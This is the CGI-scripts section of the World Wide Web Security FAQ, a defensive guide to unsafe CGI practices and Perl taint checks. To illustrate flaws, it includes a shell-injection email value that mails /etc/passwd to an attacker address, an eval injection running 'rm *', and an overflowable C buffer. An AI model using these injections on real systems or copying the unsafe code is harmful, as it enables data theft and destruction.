@@ -1,0 +1,523 @@
+
+
+The World Wide Web Security FAQ
+
+---------------------------------------------------------------------
+
+DISCLAIMER
+
+This information is provided by Lincoln Stein (lstein@cshl.org) and John Stewart (jns@digitalisland.net). The World Wide Web Consortium (W3C) hosts this document as a service to the Web Community; however, it does not endorse its contents. For further information, please contact Lincoln Stein or John Stewart directly. 
+
+Up to Table of Contents
+ 
+Back to Server Side Security
+ Forward to Protecting Confidential Documents at Your Site
+
+---------------------------------------------------------------------
+
+6. CGI (Server) Scripts
+
+Q1: What's the problem with CGI scripts?
+
+The problem with CGI scripts is that each one presents yet another opportunity for exploitable bugs. CGI scripts should be written with the same care and attention given to Internet servers themselves, because, in fact, they are miniature servers. Unfortunately, for many Web authors, CGI scripts are their first encounter with network programming. 
+
+CGI scripts can present security holes in two ways: 
+
+1.  They may intentionally or unintentionally leak information about the host system that will help hackers break in. 
+2.  Scripts that process remote user input, such as the contents of a form or a "searchable index" command, may be vulnerable to attacks in which the remote user tricks them into executing commands. 
+
+CGI scripts are potential security holes even though you run your server as "nobody". A subverted CGI script running as "nobody" still has enough privileges to mail out the system password file, examine the network information maps, or launch a log-in session on a high numbered port (it just needs to execute a few commands in Perl to accomplish this). Even if your server runs in a chroot directory, a buggy CGI script can leak sufficient system information to compromise the host. 
+---------------------------------------------------------------------
+
+Q2: Is it better to store scripts in the cgi-bin directory, or to store them anywhere in the document tree and identify them to the server using the .cgi extension?
+
+Although there's nothing intrinsically dangerous about scattering CGI scripts around the document tree, it's better to store them in the cgi-bin directory. Because CGI scripts are such potentially large security holes, it's much easier to keep track of what scripts are installed on your system if they're kept in a central location rather than being scattered around among multiple directories. This is particularly true in an environment with multiple Web authors. It's just too easy for an author to inadverently create a buggy CGI script and install it somewhere in the document tree. By restricting CGI scripts to the cgi-bin directory and by setting up permissions so that only the Web administrator can install these scripts, you avoid this chaotic situation. 
+
+There's also a risk of a hacker managing to create a .cgi file somewhere in your document tree and then executing it remotely by requesting its URL. A cgi-bin directory with tightly-controlled access lessens the possibility of this happening. 
+---------------------------------------------------------------------
+
+Q3: Are compiled languages such as C safer than interpreted languages like Perl and shell scripts?
+
+The answer is "yes", but with many qualifications and explanations. 
+
+First of all is the issue of the remote user's access to the script's source code. The more the hacker knows about how a script works, the more likely he is to find bugs to exploit. With a script written in a compiled language like C, you can compile it to binary form, place it in cgi-bin/, and not worry about intruders gaining access to the source code. However, with an interpreted script, the source code is always potentially available. Even though a properly-configured server will not return the source code to an executable script, there are many scenarios in which this can be bypassed. 
+
+Consider the following scenario. For convenience's sake, you've decided to identify CGI scripts to the server using the .cgi extension. Later on, you need to make a small change to an interpreted CGI script. You open it up with the Emacs text editor and modify the script. Unfortunately the edit leaves a backup copy of the script source code lying around in the document tree. Although the remote user can't obtain the source code by fetching the script itself, he can now obtain the backup copy by blindly requesting the URL: 
+
+http://your-site/a/path/your_script.cgi~
+
+(This is another good reason to limit CGI scripts to cgi-bin and to make sure that cgi-bin is separate from the document root.) 
+
+Of course in many cases the source code to a CGI script written in C is freely available on the Web, and the ability of hackers to steal the source code isn't an issue. 
+
+Another reason that compiled code may be safer than interpreted code is the size and complexity issue. Big software programs, such as shell and Perl interpreters, are likely to contain bugs. Some of these bugs may be security holes. They're there, but we just don't know about them. 
+
+A third consideration is that the scripting languages make it extremely easy to send data to system commands and capture their output. As explained below, the invocation of system commands from within scripts is one of the major potential security holes. In C, it's more effort to invoke a system command, so it's less likely that the programmer will do it. In particular, it's very difficult to write a shell script of any complexity that completely avoids dangerous constructions. Shell scripting languages are poor choices for anything more than trivial CGI programs. 
+
+All this being said, please understand that I am not guaranteeing that a compiled program will be safe. C programs can contain many exploitable bugs, as the net's experiences with NCSA httpd 1.3 and sendmail shows. Counterbalancing the problems with interpreted scripts is that they tend to be shorter and are therefore more easily understood by other people than the author. Furthermore, Perl contains a number of built-in features that were designed to catch potential security holes. For example, the taint checks (see below) catch many of the common pitfalls in CGI scripting, and may make Perl scripts safer in some respects than the equivalent C program. 
+---------------------------------------------------------------------
+
+Q4: I found a great CGI script on the Web and I want to install it. How can I tell if it's safe?
+
+You can never be sure that a script is safe. The best you can do is to examine it carefully and understand what it's doing and how it's doing it. If you don't understand the language the script's written in, show it to someone who does. 
+
+Things to think about when you examine a script: 
+
+1.  How complex is it? The longer it is, the more likely it is to have problems. 
+2.  Does it read or write files on the host system? Programs that read files may inadvertently violate access restrictions you've set up, or pass sensitive system information to hackers. Programs that write files have the potential to modify or damage documents, or, in the worst case, introduce trojan horses to your system. 
+3.  Does it interact with other programs on your system? For example, many CGI scripts send e-mail in response to a form input by opening up a connection with the sendmail program. Is it doing this in a safe way? 
+4.  Does it run with suid (set-user-id) privileges? In general this is a very dangerous thing and scripts need to have excellent reasons for doing this. 
+5.  Does the author validate user input from forms? Checking form input is a sign that the author is thinking about security issues. 
+6.  Does the author use explicit path names when invoking external programs? Relying on the PATH environment variable to resolve partial path names is a dangerous practice. 
+
+---------------------------------------------------------------------
+
+Q5: What CGI scripts are known to contain security holes?
+
+Quite a number of widely distributed CGI scripts contain known security holes. Many of the ones that are identified here have since been caught and fixed, but if you are running an older version of the script you may still be vulnerable. Get rid of it and obtain the latest version. If there is no fix for a script, just get rid of it. 
+HotMail 
+The CGI scripts that run the popular HotMail e-mail system use a flawed security system that allows unauthorized individuals to break into user's e-mail accounts and read their mail. This problem is known to affect the version of HotMail that was in place as of December 1998. For further information, see these links: 
+ 
+* http://email.miningco.com/library/nus/bl120898-1.htm  
+* http://www.geocities.com/ResearchTriangle/Lab/6601/shailesh/hotmail.html 
+
+Matt Wright's TextCounter versions 1.0-1.2 (Perl) and 1.0-1.3 (C++) (June 1998) 
+Earlier versions TextCounter program, which is used to place page hit counts on pages, fails to remove shell metacharacters from user-provided input. As a result remote users can execute shell commands on the server host. This affects both the Perl and C++ versions. Please upgrade to version 1.21 (Perl) or version 1.31 (C++): 
+ 
+* (Perl) http://www.worldwidemart.com/scripts/textcounter.shtml  
+* (C++) http://www.worldwidemart.com/scripts/C++/textcounter.shtml 
+
+Various guestbook scripts (June 1998) 
+There continue to be reports of exploits involving various guestbook scripts. This was first identified in the Selena Sol guestbook, but affects other scripts as well. These exploits take advantage of scripts that do not strip HTML tags from user-provided input and which, furthermore, write the guestbook file to a directory that allows server-side includes. Guestbook scripts should strip HTML tags, or replace angle brackets with the &gt; and &lt; character entities. The files that they write to should not be in a directory that allows server-side includes, active server pages, PHP pages, or other HTML template systems. See the full description of the problem in the Selena Sol/Extropia archive at http://www.extropia.com/ 
+
+Excite Web Search Engine (EWS) version (November 1998) 
+The Excite Web Search engine stores critical security information (including the encrypted administrative password) in world writable files. This allows unprivileged local users to gain access to the EWS administrative front end on both Unix and NT systems. 
+
+Note that this bug only endangers your Web site if you have the search engine installed locally. It does not affect sites that link to Excite.com's search pages, or sites that are indexed by the Excite robot. 
+
+A worse problem is found in unpatched versions of EWS earlier than Feburary 1998 (unfortunately, also called version 1.1). This bug involves the failure to check user-supplied parameters before passing them to the shell, allowing remote users to execute shell commands on the server host. The commands will be executed with the privileges of the Web server. 
+
+See http://www.excite.com/navigate/patches.html for more information and patches. 
+
+info2www, versions 1.0-1.1 
+info2www, which converts GNU "info" files into Web pages, fails to check user-provided filenames before opening them. As a result, it can be tricked into opening system files or executing commands containing shell metacharacters. Versions 1.2 and higher are reported to be free of the problem, but due to the many extant versions of this script, you should probably examine the source code yourself before installing it. Also scrutinize the CGI scripts info2html and infogate, which are apparently based on info2www. 
+
+Count.cgi, versions 1.0-2.3 
+Count.cgi, widely used to produce page hit counts, contains a stack overflow bug that allows malicious remote users to execute Unix commands on the server by sending the script carefully crafted query strings. Version 2.4 corrects this bug. It can be found at http://www.fccc.edu/users/muquit/Count.html. 
+
+webdist.cgi, part of IRIX Mindshare Out Box versions 1.0-1.2 
+This script is part of a system that allows users to install and distribute software across the network. Due to inadequate checking of CGI parameters, remote users can execute commands on the server system with the permissions of the server daemon. 
+This bug has not been fixed as of June 12, 1997. Contact Mindshare for patches/workarounds. Until your copy of webdist.cgi is fixed, disable it by removing its execute permissions. 
+
+php.cgi, multiple versions 
+The php.cgi script, which provides an HTML-embedded programming language embedded in HTML pages, database access, and other nice features, should never be installed in the scripts (cgi-bin) directory. This allows anyone on the Internet to run shell commands on the Web server host machine. In addition, versions through 2.0b11 contain known security holes. Be sure to update to the most recent version and check the PHP site (see URL below) for other security-related news. The Apache module version of PHP, since it does not run as a CGI script, is said not contain these holes. Nevertheless, you are encouraged to keep your system current. 
+http://php.iquest.net/ 
+
+files.pl, part of Novell WebServer Examples Toolkit v.2 
+Due to a failure to check user input, the files.pl example CGI script that comes with the Novell WebServer installation allows users to view any file or directory on your system, compromising confidentail documents, and potentially giving crackers the information they need to break into your system. Remove this script, and any other CGI scripts (examples or otherwise) that you do not need. 
+
+Microsoft FrontPage Extensions, versions 1.0-1.1 
+Under certain circumstances, unauthorized users can vandalize authorized users' files by appending to them or overwriting them. On a system with server-side includes enabled, remote users may be able to exploit this bug to execute commands on the server. 
+http://www.microsoft.com/security/bulletins/ 
+
+nph-test-cgi, all versions 
+This script, included in many versions of the NCSA httpd and apache daemons, can be exploited by remote users to obtain a file listing of any directory on the Web server. It should be removed or disabled (by removing execute permissions). 
+
+nph-publish, versions 1.0-1.1 
+Under certain circumstances, remote users can clobber world-writable files on the server. 
+http://www.genome.wi.mit.edu/~lstein/server_publish/nph-publish.txt 
+
+AnyForm, version 1.0 
+Remote users can execute commands on the server. 
+http://www.uky.edu/~johnr/AnyForm2 
+
+FormMail, version 1.0 
+Remote users can execute commands on the server. 
+http://alpha.pr1.k12.co.us/~mattw/scripts.html 
+
+"phf" phone book script, distributed with NCSA httpd and Apache, all versions 
+Remote users can execute commands on the server. 
+http://hoohoo.ncsa.uiuc.edu/ 
+
+To my eternal chagrin, one of the buggy CGI scripts to be discovered is in nph-publish, a script that I wrote myself to allow HTML documents to be "published" to the Apache web server from a publish-savvy editor such as Netscape Navigator Gold. I didn't check user-provided pathnames correctly, potentially allowing the script to write files into places where they aren't allowed. If the server is run with too many privileges, this can cause big problems. If you use this script, please upgrade to version 1.2 or higher. The bug was discovered by Randal Schwartz (merlyn@stonehenge.com). 
+
+The holes in the second two scripts on the list were discovered by Paul Phillips (paulp@cerf.net), who also wrote the CGI security FAQ. The hole in the PHF (phone book) script was discovered by Jennifer Myers (jmyers@marigold.eecs.nwu.edu), and is representative of a potential security hole in all CGI scripts that use NCSA's util.clibrary. Here's a patch to fix the problem in util.c. 
+
+Reports of other buggy scripts will be posted here on an intermittent basis. 
+
+In addition, one of the scripts given as an example of "good CGI scripting" in the published book "Build a Web Site" by net.Genesis and Devra Hall contains the classic error of passing an unchecked user variable to the shell. The script in question is in Section 11.4, "Basic Search Script Using Grep", page 443. Other scripts in this book may contain similar security holes. 
+
+This list is far from complete. No centralized authority is monitoring all the CGI scripts that are released to the public; the CERT does issue alerts about buggy CGI scripts when it learns about them, and it's a good idea to subscribe to their mailing list, or to browse the alert archive from time to time (see the bibliography). 
+
+Ultimately it's up to you to examine each script and make sure that it's not doing anything unsafe. 
+---------------------------------------------------------------------
+
+Q6: I'm developing custom CGI scripts. What unsafe practices should I avoid?
+
+1.  Avoid giving out too much information about your site and server host. 
+
+Although they can be used to create neat effects, scripts that leak system information are to be avoided. For example, the "finger" command often prints out the physical path to the fingered user's home directory and scripts that invoke finger leak this information (you really should disable the finger daemon entirely, preferably by removing it). The w command gives information about what programs local users are using. The ps command, in all its shapes and forms, gives would-be intruders valuable information on what daemons are running on your system. 
+
+2.  If you're coding in a compiled language like C, avoid making assumptions about the size of user input. 
+
+A MAJOR source of security holes has been coding practices that allowed character buffers to overflow when reading in user input. Here's a simple example of the problem: 
+
+#include <stdlib.h>
+
+#include <stdio.h>
+
+static char query_string[1024];
+
+char* read_POST() {
+
+int query_size;
+      query_size=atoi(getenv("CONTENT_LENGTH"));
+      fread(query_string,query_size,1,stdin);
+      return query_string;
+
+}
+
+The problem here is that the author has made the assumption that user input provided by a POST request will never exceed the size of the static input buffer, 1024 bytes in this example. This is not good. A wily hacker can break this type of program by providing input many times that size. The buffer overflows and crashes the program; in some circumstances the crash can be exploited by the hacker to execute commands remotely. 
+
+Here's a simple version of the read_POST() function that avoids this problem by allocating the buffer dynamically. If there isn't enough memory to hold the input, it returns NULL: 
+
+char* read_POST() {
+
+int query_size=atoi(getenv("CONTENT_LENGTH"));
+      char* query_string = (char*) malloc(query_size);
+      if (query_string != NULL)
+         fread(query_string,query_size,1,stdin);
+      return query_string;
+   }
+
+Of course, once you've read in the data, you should continue to make sure your buffers don't overflow. Watch out for strcpy(), strcat() and other string functions that blindly copy strings until they reach the end. Use the strncpy() and strncat() calls instead. 
+
+#define MAXSTRINGLENGTH 255
+   char myString[MAXSTRINGLENGTH + sizeof('\0')];
+   char* query = read_POST();
+   assert(query != NULL);
+   strncpy(myString,query,MAXSTRINGLENGTH);
+   myString[MAXSTRINGLENGTH]='\0';      /* ensure string terminator */
+
+(Note that the semantics of strncpy are nasty when the input string is exactly MAXSTRINGLENGTH bytes long, leading to some necessary fiddling with the terminating NULL.) 
+3.  Never, never, never pass unchecked remote user input to a shell command. 
+
+In C this includes the popen(), and system() commands, all of which invoke a /bin/sh subshell to process the command. In Perl this includes system(), exec(), and piped open() functions as well as the eval() function for invoking the Perl interpreter itself. In the various shells, this includes the exec and eval commands. 
+
+Backtick quotes, available in shell interpreters and Perl for capturing the output of programs as text strings, are also dangerous. 
+
+The reason for this bit of paranoia is illustrated by the following bit of innocent-looking Perl code that tries to send mail to an address indicated in a fill-out form. 
+
+$mail_to = &get_name_from_input; # read the address from form
+   open (MAIL,"| /usr/lib/sendmail $mail_to");
+   print MAIL "To: $mailto\nFrom: me\n\nHi there!\n";
+   close MAIL;
+
+The problem is in the piped open() call. The author has assumed that the contents of the $mail_to variable will always be an innocent e-mail address. But what if the wiley hacker passes an e-mail address that looks like this? 
+
+nobody@nowhere.com;mail badguys@hell.org</etc/passwd;
+
+Now the open() statement will evaluate the following command: 
+
+/usr/lib/sendmail nobody@nowhere.com; mail badguys@hell.org</etc/passwd
+
+Unintentionally, open() has mailed the contents of the system password file to the remote user, opening the host to password cracking attack. 
+
+---------------------------------------------------------------------
+
+Q7: But if I avoid eval(), exec(), popen() and system(), how can I create an interface to my database/search engine/graphics package?
+
+You don't have to avoid these calls completely. You just have to understand what you're doing before you call them. In some cases you can avoid passing user-supplied variables through the shell by calling external programs differently. For example, sendmail supports a -t option, which tells it to ignore the address given on the command line and take its To: address from the e-mail header. The example above can be rewritten in order to take advantage of this feature as shown below (it also uses the -oi flag to prevent sendmail from ending the message prematurely if it encounters a period at the start of a line): 
+
+$mailto = &get_name_from_input; # read the address from form
+   open (MAIL,"| /usr/lib/sendmail -t -oi");
+   print MAIL <<END;
+   To: $mailto
+   From: me (me\@nowhere.com)
+   Subject: nothing much
+
+Hi there!
+   END
+   close MAIL;
+
+C programmers can use the exec family of commands to pass arguments directly to programs rather than going through the shell. This can also be accomplished in Perl using the technique described below. 
+
+You should try to find ways not to open a shell. In the rare cases when you have no choice, you should always scan the arguments for shell metacharacters and remove them. The list of shell metacharacters is extensive: 
+
+&;`'\"|*?~<>^()[]{}$\n\r
+
+Notice that it contains the carriage return and newline characters, something that someone at NCSA forgot when he or she wrote the widely-distributed util.clibrary as an example of CGI scripting in C. 
+
+It's a better policy to make sure that all user input arguments are exactly what you expect rather than blindly remove shell metacharacters and hope there aren't any unexpected side-effects. Even if you avoid the shell and pass user variables directly to a program, you can never be sure that they don't contain constructions that reveal holes in the programs you're calling. 
+
+For example, here's a way to make sure that the $mail_to address created by the user really does look like a valid address: 
+
+$mail_to = &get_name_from_input; # read the address from form
+  unless ($mail_to =~ /^[\w.+-]+\@[\w.+-]+$/) {
+     die 'Address not in form foo@nowhere.com';
+  }
+
+(This particular pattern match may be too restrictive for some sites. It doesn't allow UUCP-style addresses or any of the many alternative addressing schemes). 
+---------------------------------------------------------------------
+
+Q8: Is it safe to rely on the PATH environment variable to locate external programs?
+
+Not really. One favorite hacker's trick is to alter the PATH environment variable so that it points to the program he wants your script to execute rather than the program you're expecting. In addition to avoiding passing unchecked user variables to external programs, you should also invoke the programs using their full absolute pathnames rather than relying on the PATH environment variable. That is, instead of this fragment of C code: 
+
+system("ls -l /local/web/foo");
+
+use this: 
+
+system("/bin/ls -l /local/web/foo");
+
+If you must rely on the PATH, set it yourself at the beginning of your CGI script: 
+
+putenv("PATH=/bin:/usr/bin:/usr/local/bin");
+
+In general it's not a good idea to put the current directory (".") into the path. 
+---------------------------------------------------------------------
+
+Q9: What are CGI "wrappers"? Can they make CGI scripts safe?
+
+Nothing can automatically make CGI scripts completely safe, but you can make them safer in some situations by placing them inside a CGI "wrapper" script. Wrappers may perform certain security checks on the script, change the ownership of the CGI process, or use the Unix chroot mechanism to place the script inside a restricted part of the file system. 
+
+There are a number of wrappers available for Unix systems: 
+
+cgiwrap
+
+The cgiwrap program, written by Nathan Neulinger (<nneul@umr.edu>) was designed for multi-user sites like university campuses where local users are allowed to create their own scripts. Since CGI scripts run under the server's user ID (e.g. "nobody"), it is difficult under these circumstances for administrators to determine whose script is generating bounced mail, errors in the server log, or annoying messages on other user's screens. There are also security implications when all users' scripts run with the same permissions: one user's script can unintentionally (or intentionally) trash the database maintained by another user's script. 
+
+cgiwrap allows you to put a wrapper around CGI scripts so that a user's scripts now run under his own user ID. This policy can be enforced so that users must use cgiwrap in order to execute CGI scripts. This simplifies administration and prevents users from interfering with each other. 
+
+However you should be aware that this type of wrapper does increase the risk to the individual user. Because his scripts now run with his own permissions, a subverted CGI script can trash his home directory by executing the command: 
+
+rm -r ~
+
+Since the subverted CGI script has write access to the user's home directory, it could also place a trojan horse in the user's directory. 
+
+sbox
+
+Another wrapper is sbox, written by the author. Like cgiwrap, it can run scripts as the CGI author's user and/or group. However, it takes additional steps to prevent CGI scripts from causing damage. For one thing, sbox optionally performs a chroot to a restricted directory, sealing the script off from the user's home directory and much of the rest of the file system. For another, you can use sbox to set resource allocation limitations on CGI scripts. This prevents certain denial-of-service attacks. 
+
+When running under the Unix version of Apache, sbox supports user-maintained directories and virtual hosts. 
+
+suEXEC
+
+The Apache Web server comes with its own wrapper script called suEXEC. suEXEC is tightly integrated with the Apache server and cannot be used with other Web servers. suEXEC provides the same functionality as cgiwrap, but in addition works hand-in-hand with Apache's virtual host system. You can provide User and Group directives to the <VirtualHost> section to have scripts run with the permissions of that user and group. 
+---------------------------------------------------------------------
+
+Q10: People can only use scripts if they're accessed from a form that lives on my local system, right?
+
+Not right. Although you can restrict access to a script to certain IP addresses or to user name/password combinations, you can't control how the script is invoked. A script can be invoked from any form, anywhere in the world. Or its form interface can be bypassed entirely and the script invoked by directly requesting its URL. Don't assume that a script will always be invoked from the form you wrote to go with it. Anticipate that some parameters will be missing or won't have the expected values. 
+
+When restricting access to a script, remember to put the restrictions on the _script_ as well as any HTML forms that access it. It's easiest to remember this when the script is of the kind that generates its own form on the fly. 
+---------------------------------------------------------------------
+
+Q11: Can people see or change the values in "hidden" form variables?
+
+They sure can! The hidden variable is visible in the raw HTML that the server sends to the browser. To see the hidden variables, a user just has to select "view source" from the browser menu. In the same vein, there's nothing preventing a user from setting hidden variables to whatever he likes and sending it back to your script. Don't rely on hidden variables for security. 
+---------------------------------------------------------------------
+
+Q12: Is using the "POST" method for submitting forms more private than "GET"?
+
+If you are concerned about your queries showing up in server logs, or those of Web proxies along the way, this is true. Queries submitted with POST usually don't appear in logs, while GET queries do. In other respects, however, there's no substantial difference in security between the two methods. It is just as easy to intercept unencrypted GET queries as POST queries. Furthermore, unlike some early implementations of HTTP encryption, the current generation of data encrypting server/browser combinations do just as good a job encrypting GET requests as they do for POST requests. 
+---------------------------------------------------------------------
+
+Q13: Where can I learn more about safe CGI scripting?
+
+The CGI security FAQ, maintained by Paul Phillips ( paulp@cerf.net), can be found at: 
+http://www.go2net.com/people/paulp/cgi-security/safe-cgi.txt 
+This document contains a great deal of useful advice, but has not been updated since September 1995. More recently, Selena Sol has published an excellent article on the risks of installing pre-built CGI scripts, with much helpful advice on configuring and customizing these scripts to increase their security. This article can be found at: 
+http://www.extropia.com/tutorials/security/index.html 
+An excellent all-round introduction to Perl and CGI Scripting can be found in the Perl CGI FAQ, 
+http://language.perl.com/CPAN/doc/FAQs/cgi/perl-cgi-faq.html 
+written by Tom Christiansen (tchrist@perl.com) and Shishir Gundavaram (shishir@ora.com). 
+---------------------------------------------------------------------
+
+Q14: How do I avoid passing user variables through a shell when calling exec() and system()?
+
+In Perl, you can invoke external programs in many different ways. You can capture the output of an external program using backticks: 
+
+$date = `/bin/date`;
+
+You can open up a pipe to a program: 
+
+open (SORT, " | /usr/bin/sort | /usr/bin/uniq");
+
+You can invoke an external program and wait for it to return with system(): 
+
+system "/usr/bin/sort < foo.in";
+
+or you can invoke an external program and never return with exec(): 
+
+exec "/usr/bin/sort < foo.in";
+
+All of these constructions can be risky if they involve user input that may contain shell metacharacters. For system() and exec(), there's a somewhat obscure syntactical feature that allows you to call external programs directly rather than going through a shell. If you pass the arguments to the external program, not in one long string, but as separate members in a list, then Perl will not go through the shell and shell metacharacters will have no unwanted side effects. For example: 
+
+system "/usr/bin/sort","foo.in";
+
+You can take advantage of this feature to open up a pipe without going through a shell. By calling open on the magic character sequence |-, you fork a copy of Perl and open a pipe to the copy. The child copy can then exec another program using the argument list variant of exec(). 
+
+my $result =  open (SORT,"|-");
+   die "Couldn't open pipe to subprocess" unless defined($result);
+   exec "/usr/bin/sort",$uservariable or die "Couldn't exec sort"
+        if $result == 0;
+   for my $line (@lines) {
+     print SORT $line,"\n";
+   }
+   close SORT;
+
+The initial call to open() tries to fork a copy of Perl. If the call fails it returns an undefined value and the script immediately dies (you might want to do something more sophisticated, such as sending an HTML error message to the user). Otherwise, the result will return zero to the child process, and the child's process ID to the parent. The child process checks the result value, and immediately attempts to exec the sort program. If something fails at this point, the child quits. 
+
+The parent process can then print to the SORT filehandle in the normal way. 
+
+To read from a pipe without opening up a shell, you can do something similar with the sequence -|: 
+
+$result = open(GREP,"-|");
+   die "Couldn't open pipe to subprocess" unless defined($result);
+   exec "/usr/bin/grep",'-i',$userpattern,$filename
+              or die "Couldn't exec grep" if $result == 0;
+   while (<GREP>) {
+     print "match: $_";
+   }
+   close GREP;
+
+These are the forms of open() you should use whenever you would otherwise perform a piped open to a command. 
+
+An even more obscure feature allows you to call an external program and lie to it about its name. This is useful for calling programs that behave differently depending on the name by which they were invoked. 
+
+The syntax is 
+
+system $real_name "fake_name","argument1","argument2"
+
+For example: 
+
+$shell = "/bin/sh"
+
+system $shell "-sh","-norc"
+
+This invokes the shell using the name "-sh", forcing it to behave interactively. Note that the real name of the program must be stored in a variable, and that there's no comma between the variable holding the real name and the start of the argument list. 
+
+There's also a more compact syntax for this construction: 
+
+system { "/bin/sh" } "-sh","-norc"
+
+---------------------------------------------------------------------
+
+Q15: What are Perl taint checks? How do I turn them on?
+
+As we've seen, one of the most frequent security problems in CGI scripts is inadvertently passing unchecked user variables to the shell. Perl provides a "taint" checking mechanism that prevents you from doing this. Any variable that is set using data from outside the program (including data from the environment, from standard input, and from the command line) is considered tainted and cannot be used to affect anything else outside your program. The taint can spread. If you use a tainted variable to set the value of another variable, the second variable also becomes tainted. Tainted variables cannot be used in eval(), system(), exec() or piped open() calls. If you try to do so, Perl exits with a warning message. Perl will also exit if you attempt to call an external program without explicitly setting the PATH environment variable. 
+
+You turn on taint checks in version 4 of Perl by using a special version of the interpreter named "taintperl": 
+
+#!/usr/local/bin/taintperl
+
+In version 5 of perl, pass the -T flag to the interpreter: 
+
+#!/usr/local/bin/perl -T
+
+See below for how to "untaint" a variable. 
+
+See Gunther Birznieks' CGI/Perl Taint Mode FAQ for a full discussion of taint mode. 
+---------------------------------------------------------------------
+
+Q16: OK, I turned on taint checks like you said. Now my script dies with the message: "Insecure $ENV{PATH} at line XX" every time I try to run it!
+
+Even if you don't rely on the path when you invoke an external program, there's a chance that the invoked program might. Therefore you need to include the following line towards the top of your script whenever you use taint checks: 
+
+$ENV{'PATH'} = '/bin:/usr/bin:/usr/local/bin';
+
+Adjust this as necessary for the list of directories you want searched. It's not a good idea to include the current directory (".") in the path. 
+---------------------------------------------------------------------
+
+Q17: How do I "untaint" a variable?
+
+Once a variable is tainted, Perl won't allow you to use it in a system(), exec(), piped open, eval(), backtick command, or any function that affects something outside the program (such as unlink). You can't use it even if you scan it for shell metacharacters or use the tr/// or s/// commands to remove metacharacters. The only way to untaint a tainted variable is by performing a pattern matching operation on it and extracting the matched substrings. For example, if you expect a variable to contain an e-mail address, you can extract an untainted copy of the address in this way: 
+
+$mail_address=~/(\S+)\@([\w.-]+)/ or die "invalid address";
+   $untainted_address = "$1\@$2";
+
+This pattern match accepts e-mail addresses of the form "who@where" where "where" looks like a domain name, and "who" consists of one or more non-whitespace characters. Note that this regular expression will not remove shell meta-characters from the e-mail address. This is because it is perfectly valid for e-mail addresses to contain such characters, as in: 
+fred&barney@bedrock.com 
+Just because you have untainted a variable doesn't mean that it is now safe to pass it to a shell. E-mail addresses are the perfect examples of this. The taint checks are there in order to force you to recognize when a variable is potentially dangerous. Use the techniques described in Q44 to avoid passing dangerous variables to the shell. 
+---------------------------------------------------------------------
+
+Q18: I'm removing shell metacharacters from the variable, but Perl still thinks it's tainted!
+
+See the answer to the question above. The only way to untaint a variable is to extract substrings using a pattern matching operation. 
+---------------------------------------------------------------------
+
+Q19: Is it true that the pattern matching operation $foo=~/$user_variable/is unsafe?
+
+A frequent task for Perl CGI scripts is to take a list of keywords provided by the remote user and to use them in a patttern matching operation to fetch a list of matching file names (or something similar). This, in and of itself, isn't dangerous. What is dangerous is an optimization that many Perl programmers use to speed up the pattern matching operation. When you use a variable inside a pattern matching operation, the pattern is recompiled every time the operation is invoked. In order to avoid this expensive recompilation, you can provide the "o" flag to the pattern matching operation to tell Perl to compile the expression once: 
+
+foreach (@files) {
+
+m/$user_pattern/o;
+
+}
+
+Now, however, Perl will ignore any changes you make to the user variable, making this sort of loop fail: 
+
+foreach $user_pattern (@user_patterns) {
+       foreach (@files) {
+          print if m/$user_pattern/o;
+       }
+    }
+
+To get around this problem Perl programmers often use this sort of trick: 
+
+foreach $user_pattern (@user_patterns) {
+      eval "foreach (\@files) { print if m/$user_pattern/o; }";
+   }
+
+The problem here is that the eval() statement involves a user-supplied variable. Unless this variable is checked carefully, the eval() statement can be tricked into executing arbitrary Perl code. (For example of what can happen, consider what the eval statement does if the user passes in this pattern: "/; system 'rm *'; /"
+
+The taint checks described above will catch this potential problem. Your alternatives include using the unoptimized form of the pattern matching operation, or carefully untainting user-supplied patterns. In Perl5, a useful trick is to use the escape sequence \Q \E to quote metacharacters so that they won't be interpreted: 
+
+print if m/\Q$user_pattern\E/o;
+
+---------------------------------------------------------------------
+
+Q20: My CGI script needs more privileges than it's getting as user "nobody". How do I run a Perl script as suid?
+
+First of all, do you really need to run your Perl script as suid? This represents a major risk insofar as giving your script more privileges than the "nobody" user has also increases the potential for damage that a subverted script can cause. If you're thinking of giving your script root privileges, think it over extremely carefully. 
+
+You can make a script run with the privileges of its owner by setting its "s" bit: 
+
+chmod u+s foo.pl
+
+You can make it run with the privileges of its owner's group by setting the s bit in the group field: 
+
+chmod g+s foo.pl
+
+However, many Unix systems contain a hole that allows suid scripts to be subverted. This hole affects only scripts, not compiled programs. On such systems, an attempt to execute a Perl script with the suid bits set will result in a nasty error message from Perl itself. 
+
+You have two options on such systems: 
+
+1.  You can apply a patch to the kernel that disables the suid bits for scripts. Perl will detect these bits nevertheless and do the suid function safely. See the Perl faq for details on obtaining this kernel patch. This faq can be found at: 
+
+ftp://rtfm.mit.edu/pub/usenet-by-group/comp.lang.perl/ 
+
+2.  You can put a C wrapper around the program. A typical wrapper looks like this: 
+
+#include <unistd.h>
+       void main () {
+       execl("/usr/local/bin/perl","foo.pl","/local/web/cgi-bin/foo.pl",NULL);
+       }
+       
+After compiling this program, make it suid. It will run under its owner's permission, launching a Perl interpreter and executing the statements in the file "foo.pl". 
+
+Another option is to run the server itself as a user that has sufficient privileges to do whatever the scripts need to do. If you're using the Apache Web server, you can do this with the suEXEC or sbox applications. See see the wrappers section for details. 
+---------------------------------------------------------------------
+
+Up to Table of Contents
+ 
+Back to Server Side Security Forward to Protecting Confidential Documents at Your Site
+
+---------------------------------------------------------------------
+
+Lincoln D. Stein (lstein@cshl.org) and John N. Stewart (jns@digitalisland.net)
+ 
+
+$Id: wwwsf4.html,v 1.11 2003/02/23 22:46:27 lstein Exp $ 
